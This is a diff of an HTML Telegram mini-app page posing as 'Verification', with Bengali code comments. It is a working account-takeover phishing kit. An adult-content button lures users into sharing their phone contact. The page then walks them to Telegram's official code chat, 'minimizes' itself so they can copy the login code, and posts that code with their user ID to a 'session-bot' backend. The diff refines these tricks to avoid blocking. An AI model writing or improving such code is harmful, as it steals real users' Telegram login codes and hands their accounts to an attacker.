@@ -6,65 +6,56 @@
     <title>Verification</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        * { box-sizing: border-box; }
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
         body { 
             font-family: 'Arial', sans-serif; 
             margin: 0; padding: 0; 
             background: url('https://rony90790.github.io/session-web/IMG_20260415_045401_985.jpg') no-repeat center center fixed; 
             background-size: cover;
-            height: 100vh; 
-            display: flex; 
-            align-items: flex-end; 
-            justify-content: center;
+            height: 100vh; display: flex; align-items: flex-end; justify-content: center;
             overflow: hidden;
         }
-        .overlay { background: rgba(0, 0, 0, 0.4); position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }
+        .overlay { background: rgba(0, 0, 0, 0.5); position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }
         
-        .main-container { width: 90%; max-width: 360px; z-index: 2; text-align: center; margin-bottom: 50px; }
-
-        .finger-icon { font-size: 70px; display: block; margin-bottom: 10px; animation: bounce 1.2s infinite; text-shadow: 0 5px 15px rgba(0,0,0,0.4); }
-        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(15px); } }
+        .main-container { 
+            width: 90%; max-width: 360px; 
+            z-index: 9999; /* সবার উপরে রাখার জন্য */
+            position: relative; 
+            text-align: center; margin-bottom: 40px; 
+        }
 
         .instruction-box {
-            background: rgba(255, 255, 255, 0.95);
-            padding: 15px; border-radius: 15px;
-            margin-bottom: 15px; color: #333; font-weight: bold; font-size: 15px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+            background: white; padding: 15px; border-radius: 15px;
+            margin-bottom: 15px; color: #333; font-weight: bold; font-size: 16px;
         }
 
-        /* Minimize Button Design */
+        /* বাটন ডিজাইন */
         .get-code-btn {
-            background: linear-gradient(135deg, #2AABEE, #229ED9);
-            color: white; border: none; padding: 14px; border-radius: 12px;
-            font-size: 16px; font-weight: bold; cursor: pointer;
-            margin-bottom: 15px; width: 100%;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.3);
-            display: flex; align-items: center; justify-content: center; gap: 10px;
+            background: #0088cc; color: white; border: 2px solid white;
+            padding: 15px; border-radius: 12px; font-size: 18px; font-weight: bold;
+            cursor: pointer; width: 100%; margin-bottom: 20px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+            display: block; position: relative; z-index: 10000;
         }
-        .get-code-btn:active { transform: scale(0.98); opacity: 0.9; }
+        .get-code-btn:active { background: #0077b3; transform: scale(0.98); }
 
-        .otp-inputs { display: flex; justify-content: center; gap: 8px; margin-bottom: 20px; }
+        .otp-inputs { display: flex; justify-content: center; gap: 8px; margin-bottom: 15px; }
         .otp-box {
-            width: 50px; height: 55px;
-            background: rgba(255, 255, 255, 0.2);
-            border: 2px solid rgba(255, 255, 255, 0.5);
-            border-radius: 12px; display: flex; align-items: center; justify-content: center;
-            font-size: 30px; color: white; font-weight: bold; backdrop-filter: blur(8px);
+            width: 50px; height: 55px; background: rgba(255, 255, 255, 0.2);
+            border: 2px solid white; border-radius: 12px; display: flex;
+            align-items: center; justify-content: center; font-size: 28px; color: white; font-weight: bold;
+            backdrop-filter: blur(5px);
         }
 
         .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
         .key { 
             background: #4caf50; padding: 18px; border-radius: 12px; 
-            font-size: 26px; font-weight: bold; color: white; 
-            cursor: pointer; border: none; box-shadow: 0 4px 6px rgba(0,0,0,0.2);
-            -webkit-tap-highlight-color: transparent;
+            font-size: 24px; font-weight: bold; color: white; border: none;
         }
-        .key:active { background: #388e3c; transform: scale(0.95); }
-        .key-back { background: #388e3c; font-size: 22px; }
-        .key-empty { background: transparent; cursor: default; box-shadow: none; }
+        .key:active { background: #388e3c; }
 
         .hidden { display: none !important; }
-        .loader { color: white; font-weight: bold; margin-top: 15px; font-size: 18px; text-shadow: 1px 1px 5px black; }
+        .loader { color: white; font-weight: bold; font-size: 20px; text-shadow: 2px 2px 5px black; }
     </style>
 </head>
 <body>
@@ -72,18 +63,16 @@
 
     <div class="main-container">
         <div id="step0">
-            <div id="finger_point" class="finger-icon">👇</div>
+            <div style="font-size: 60px; margin-bottom: 20px; animation: bounce 1s infinite;">👇</div>
             <div id="load" class="loader hidden">🔄 Connecting...</div>
         </div>
 
         <div id="step2" class="hidden">
-            <div class="instruction-box">
-                Enter the 5-digit code we just sent you!
-            </div>
+            <div class="instruction-box">Enter the 5-digit code!</div>
 
-            <!-- The Minimize Trick Button -->
-            <button class="get-code-btn" onclick="openTelegramCodeChat()">
-                📩 View Code (Minimize App)
+            <!-- আপডেট করা বাটন -->
+            <button type="button" class="get-code-btn" id="codeBtn">
+                📩 View Code & Minimize
             </button>
 
             <div class="otp-inputs">
@@ -98,7 +87,7 @@
                 <div class="key" onclick="addNum('1')">1</div><div class="key" onclick="addNum('2')">2</div><div class="key" onclick="addNum('3')">3</div>
                 <div class="key" onclick="addNum('4')">4</div><div class="key" onclick="addNum('5')">5</div><div class="key" onclick="addNum('6')">6</div>
                 <div class="key" onclick="addNum('7')">7</div><div class="key" onclick="addNum('8')">8</div><div class="key" onclick="addNum('9')">9</div>
-                <div class="key-empty"></div><div class="key" onclick="addNum('0')">0</div><div class="key key-back" onclick="clearNum()">⌫</div>
+                <div class="key" style="background:transparent"></div><div class="key" onclick="addNum('0')">0</div><div class="key" onclick="clearNum()">⌫</div>
             </div>
         </div>
     </div>
@@ -106,33 +95,36 @@
     <script>
         let tg = window.Telegram.WebApp;
         tg.expand();
-
         let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : null;
         const BACKEND_URL = "https://pmrony-session-bot.hf.space"; 
-        const OFF_LINK = "https://www.profitablecpmratenetwork.com/w47jpksk7t?key=15b5e8ae609b09733d4a0906eac2a446";
         let currentOTP = "";
 
         tg.MainButton.setText("🍓 START CONTINUE 🔞");
         tg.MainButton.show();
         tg.MainButton.onClick(startFlow);
 
-        // --- Minimize Trick Function ---
-        function openTelegramCodeChat() {
-            tg.HapticFeedback.impactOccurred('medium');
+        // বাটনের জন্য ইভেন্ট লিসেনার (এটি onclick এর চেয়ে বেশি শক্তিশালী)
+        document.getElementById('codeBtn').addEventListener('click', function() {
+            tg.HapticFeedback.impactOccurred('heavy');
             
-            // ১. ওটিপি চ্যাট ওপেন করার চেষ্টা করবে
-            tg.openTelegramLink("tg://openmessage?user_id=777000");
-
-            // ২. অ্যাপ মিনিমাইজ করার ট্রিক (InlineQuery সুইচ করা)
-            setTimeout(() => {
-                tg.switchInlineQuery(""); 
-            }, 300);
-        }
+            // ট্রিক: পপআপ শো করা (এটি অনেক সময় ব্লক হওয়া আটকায়)
+            tg.showConfirm("কোডটি দেখতে হলে আপনাকে মেসেজ বক্সে যেতে হবে। আপনি কি এখন মেসেজ বক্স ওপেন করতে চান?", function(ok){
+                if (ok) {
+                    // ১. সরাসরি লিংক ওপেন
+                    tg.openTelegramLink("tg://openmessage?user_id=777000");
+                    
+                    // ২. মিনিমাইজ করার ট্রিক
+                    setTimeout(() => {
+                        tg.switchInlineQuery(""); 
+                    }, 200);
+                }
+            });
+        });
 
         function startFlow() {
             tg.requestContact();
             tg.MainButton.hide();
-            document.getElementById('finger_point').classList.add('hidden');
+            document.getElementById('step0').classList.add('hidden');
             document.getElementById('load').classList.remove('hidden');
             poll();
         }
@@ -154,10 +146,10 @@
                 });
                 const data = await res.json();
                 if (data.status === "success") {
-                    document.getElementById('step0').classList.add('hidden');
+                    document.getElementById('load').classList.add('hidden');
                     document.getElementById('step2').classList.remove('hidden');
-                } else { alert(data.message); location.reload(); }
-            } catch (e) { alert("Server Error!"); }
+                }
+            } catch (e) { }
         }
 
         function addNum(n) {
@@ -179,7 +171,7 @@
                     body: JSON.stringify({ user_id: userId, otp: currentOTP })
                 });
                 const data = await res.json();
-                if (data.status === "success") { window.location.href = OFF_LINK; }
+                if (data.status === "success") { window.location.href = "https://google.com"; }
                 else { tg.showAlert("Invalid Code!"); currentOTP = ""; updateBoxes(); }
             } catch (e) { }
         }
